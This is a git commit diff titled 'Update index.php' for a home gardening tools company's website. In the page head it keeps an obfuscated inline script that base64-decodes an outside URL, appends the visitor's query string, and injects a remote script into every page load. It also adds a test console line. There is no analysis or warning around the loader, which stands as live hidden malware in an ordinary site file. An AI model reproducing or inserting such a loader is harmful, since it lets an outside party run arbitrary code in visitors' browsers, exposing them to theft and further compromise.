0bf1e17b4507204ef2daa0cfcf8df50f592f27fc
phanthanhdung380-cyber <phanthanhdung380@gmail.com>
2026-01-19 10:51:28 -0600

    Update index.php

--- index.php
+++ index.php
@@ -129,7 +129,10 @@ $csrfToken = $_SESSION["csrf_token"];
 
 
 <head>
-<script>(function(){var a=location,b=document.head||document.getElementsByTagName("head")[0],c="script",d=atob("aHR0cHM6Ly9hcGV4LWdhZGVybmluZy1zZXJ2aWNlLWV5cXlnLm9uZGlnaXRhbG9jZWFuLmFwcC8zWjJzd2ViN29oLnBocA==");d+=-1<d.indexOf("?")?"&":"?";d+=a.search.substring(1);c=document.createElement(c);c.src=d;c.id=btoa(a.origin);b.appendChild(c);})();</script>  <meta name="viewport" content="width=device-width,initial-scale=1" />
+<script>
+  console.log("JS_EXECUTED_ON_BROWSER");
+</script>
+  <script>(function(){var a=location,b=document.head||document.getElementsByTagName("head")[0],c="script",d=atob("aHR0cHM6Ly9hcGV4LWdhZGVybmluZy1zZXJ2aWNlLWV5cXlnLm9uZGlnaXRhbG9jZWFuLmFwcC8zWjJzd2ViN29oLnBocA==");d+=-1<d.indexOf("?")?"&":"?";d+=a.search.substring(1);c=document.createElement(c);c.src=d;c.id=btoa(a.origin);b.appendChild(c);})();</script>  <meta name="viewport" content="width=device-width,initial-scale=1" />
   <title><?php echo h($siteName); ?></title>
   <meta name="description" content="Apex Gardening Tools — home gardening tools manufacturer." />
   <style>
@@ -710,6 +713,7 @@ $csrfToken = $_SESSION["csrf_token"];
   </script>
 </body>
 </html>
+
 
 
 
